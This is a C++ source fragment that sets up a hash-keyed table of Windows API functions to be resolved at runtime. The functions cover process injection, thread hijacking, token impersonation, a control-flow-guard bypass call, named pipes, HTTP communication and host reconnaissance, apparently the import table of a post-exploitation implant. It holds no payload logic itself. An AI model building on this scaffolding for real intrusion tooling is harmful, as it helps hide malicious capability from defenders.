#define CALL_FUNCTION(mod_i, fn_i) \
    (reinterpret_cast<decltype(&win32[mod_i].functions[fn_i].function)>(win32[mod_i].functions[fn_i].function))



struct FunctionEntry {
  UINT32 fn_hash;
  LVPOID function;
};

__attribute__((used, section(".data"))) struct API {
    UINT32        mod_hash;
    FunctionEntry functions[64];

} win32[] = {
  { NTDLL,
    {
      { NTOPENPROCESS, nullptr },
      { NTCREATEUSERPROCESS, nullptr },
      { NTTERMINATEPROCESS, nullptr },
      { RTLCREATEPROCESSPARAMETERSEX, nullptr },
      { RTLDESTROYPROCESSPARAMETERS, nullptr },
      { NTOPENPROCESSTOKEN, nullptr },
      { NTOPENTHREADTOKEN, nullptr },
      { NTDUPLICATETOKEN, nullptr },
      { NTDUPLICATEOBJECT, nullptr },
      { NTQUERYINFORMATIONTOKEN, nullptr },
      { NTQUERYINFORMATIONPROCESS, nullptr },
      { NTFREEVIRTUALMEMORY, nullptr },
      { NTALLOCATEVIRTUALMEMORY, nullptr },
      { NTPROTECTVIRTUALMEMORY, nullptr },
      { NTREADVIRTUALMEMORY, nullptr },
      { NTWRITEVIRTUALMEMORY, nullptr },
      { NTQUERYVIRTUALMEMORY, nullptr },
      { NTCREATESECTION, nullptr },
      { NTMAPVIEWOFSECTION, nullptr },
      { NTUNMAPVIEWOFSECTION, nullptr },
      { RTLADDVECTOREDEXCEPTIONHANDLER, nullptr },
      { RTLREMOVEVECTOREDEXCEPTIONHANDLER, nullptr },
      { RTLCREATEHEAP, nullptr },
      { RTLALLOCATEHEAP, nullptr },
      { RTLREALLOCATEHEAP, nullptr },
      { RTLFREEHEAP, nullptr },
      { RTLDESTROYHEAP, nullptr },
      { RTLRBINSERTNODEEX, nullptr },
      { RTLGETVERSION, nullptr },
      { NTQUERYSYSTEMINFORMATION, nullptr },
      { NTQUERYSYSTEMTIME, nullptr },
      { NTCREATETHREADEX, nullptr },
      { NTOPENTHREAD, nullptr },
      { NTTERMINATETHREAD, nullptr },
      { NTRESUMETHREAD, nullptr },
      { NTGETCONTEXTTHREAD, nullptr },
      { NTSETCONTEXTTHREAD, nullptr },
      { NTSETINFORMATIONTHREAD, nullptr },
      { NTTESTALERT, nullptr },
      { NTDELAYEXECUTION, nullptr },
      { NTCREATEEVENT, nullptr },
      { NTQUEUEAPCTHREAD, nullptr },
      { NTALERTRESUMETHREAD, nullptr },
      { NTWAITFORSINGLEOBJECT, nullptr },
      { NTSIGNALANDWAITFORSINGLEOBJECT, nullptr },
      { NTCONTINUE, nullptr },
      { RTLINITUNICODESTRING, nullptr },
      { RTLHASHUNICODESTRING, nullptr },
      { RTLRANDOMEX, nullptr },
      { NTCLOSE, nullptr },
      { 0, nullptr },
    }
  },
  {
    KERNEL32,
    {
      { FILETIMETOSYSTEMTIME, nullptr },
      { GETCURRENTDIRECTORYA, nullptr },
      { SYSTEMTIMETOTZSPECIFICLOCALTIME, nullptr },
      { GETFILEATTRIBUTESW, nullptr },
      { CREATEFILEW, nullptr },
      { FINDFIRSTFILEA, nullptr },
      { FINDNEXTFILEA, nullptr },
      { FINDCLOSE, nullptr },
      { GETFILESIZE, nullptr },
      { READFILE, nullptr },
      { CALLNAMEDPIPEW, nullptr },
      { CREATENAMEDPIPEW, nullptr },
      { WAITNAMEDPIPEW, nullptr },
      { SETNAMEDPIPEHANDLESTATE, nullptr },
      { CONNECTNAMEDPIPE, nullptr },
      { TRANSACTNAMEDPIPE, nullptr },
      { DISCONNECTNAMEDPIPE, nullptr },
      { PEEKNAMEDPIPE, nullptr },
      { GETPROCADDRESS, nullptr },
      { GETMODULEHANDLEA, nullptr },
      { LOADLIBRARYA, nullptr },
      { FREELIBRARY, nullptr },
      { ISWOW64PROCESS, nullptr },
      { GETUSERNAMEA, nullptr },
      { CREATETOOLHELP32SNAPSHOT, nullptr },
      { PROCESS32FIRST, nullptr },
      { PROCESS32NEXT, nullptr },
      { GLOBALMEMORYSTATUSEX, nullptr },
      { GETCOMPUTERNAMEEXA, nullptr },
      { CLRCREATEINSTANCE, nullptr },
      { SLEEPEX, nullptr },
      { FINDRESOURCEA, nullptr },
      { LOADRESOURCE, nullptr },
      { LOCKRESOURCE, nullptr },
      { SIZEOFRESOURCE, nullptr },
      { FREERESOURCE, nullptr },
      { 0, nullptr },
    }
  },
  {
    ADVAPI32,
    {
      { LOOKUPACCOUNTSIDW, nullptr },
      { LOOKUPPRIVILEGEVALUEA, nullptr },
      { ADDMANDATORYACE, nullptr },
      { SETENTRIESINACLA, nullptr },
      { ALLOCATEANDINITIALIZESID, nullptr },
      { INITIALIZESECURITYDESCRIPTOR, nullptr },
      { SETSECURITYDESCRIPTORDACL, nullptr },
      { SETSECURITYDESCRIPTORSACL, nullptr },
      { INITIALIZEACL, nullptr },
      { FREESID, nullptr },
      { IMPERSONATELOGGEDONUSER, nullptr },
      { ADJUSTTOKENPRIVILEGES, nullptr },
      { REGOPENKEYEXA, nullptr },
      { REGCREATEKEYEXA, nullptr },
      { REGSETVALUEEXA, nullptr },
      { REGCLOSEKEY, nullptr },
      { 0, nullptr },
    }
  }, 
  {
    WINHTTP, 
    {
      { WINHTTPOPEN, nullptr },
      { WINHTTPCONNECT, nullptr },
      { WINHTTPOPENREQUEST, nullptr },
      { WINHTTPADDREQUESTHEADERS, nullptr },
      { WINHTTPSETOPTION, nullptr },
      { WINHTTPGETPROXYFORURL, nullptr },
      { WINHTTPGETIEPROXYCONFIGFORCURRENTUSER, nullptr },
      { WINHTTPSENDREQUEST, nullptr },
      { WINHTTPRECEIVERESPONSE, nullptr },
      { WINHTTPREADDATA, nullptr },
      { WINHTTPQUERYHEADERS, nullptr },
      { WINHTTPQUERYDATAAVAILABLE, nullptr },
      { WINHTTPCLOSEHANDLE, nullptr },
      { 0, nullptr },
    }
  }, 
  {
    CRYPT32,
    {
      { CRYPTSTRINGTOBINARYA, nullptr },
      { CRYPTBINARYTOSTRINGA, nullptr },
      { 0, nullptr },
    }
  },
  {
    KERNELBASE,
    {
      { SETPROCESSVALIDCALLTARGETS, nullptr },
      { 0, nullptr },
    }
  },
  {
    IPHLPAPI,
    {
      { GETADAPTERSINFO, nullptr },
      { 0, nullptr },
    }
  }
};
